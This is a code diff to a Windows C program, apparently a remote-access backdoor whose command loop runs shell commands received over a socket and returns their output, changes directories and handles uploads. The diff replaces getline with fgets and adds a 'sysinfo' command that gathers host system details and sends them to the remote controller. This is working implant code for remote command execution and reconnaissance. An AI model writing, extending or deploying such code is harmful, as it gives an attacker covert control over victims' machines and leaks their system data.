@@ -8,6 +8,7 @@
 #include <locale.h>
 #include <shlwapi.h>
 #include "../src/base64.c"
+#include "../src/sysInfoWin.c"
 
 // Definiciones
 #define SOCKBUFF 2048
@@ -40,8 +41,7 @@ int excndSend(int conn, char *cmd){
     }
     
     FILE *xx = NULL;
-    char *path = NULL;
-    size_t path_size = 0;
+    char path[1024];
 
     char fullCmd[CMDBUFF] = "";
     snprintf(fullCmd, sizeof(fullCmd), "%s 2>&1", cmd); 
@@ -53,11 +53,10 @@ int excndSend(int conn, char *cmd){
         return 1;
     }
 
-    while (getline(&path, &path_size, xx) != -1){
+    while (fgets(path, sizeof(path), xx) != NULL){
         send(conn, path, strlen(path), 0);
     }
 
-    free(path);
     Sleep(300);
     send(conn, "end\0", strlen("end\0"), 0);
     _pclose(xx);
@@ -88,7 +87,7 @@ void _chdir(int conn, char *instruct){
     send(conn, newDir, strlen(newDir), 0);
     Sleep(300);
     send(conn, "end\0", strlen("end\0"), 0);
-
+    
     free(directory);
     free(newDir);
 
@@ -264,7 +263,12 @@ int mainLoop(int conn){
             
         else if (strstr(instruct, "upload") != NULL)
             uploadFunc(instruct, conn);
-        else
+
+        else if (strcmp(instruct, "sysinfo") == 0){
+            strtAll(conn);
+            send(conn, "end\0", strlen("end\0"), 0);
+        
+        } else
             continue;
     }
     return 0;
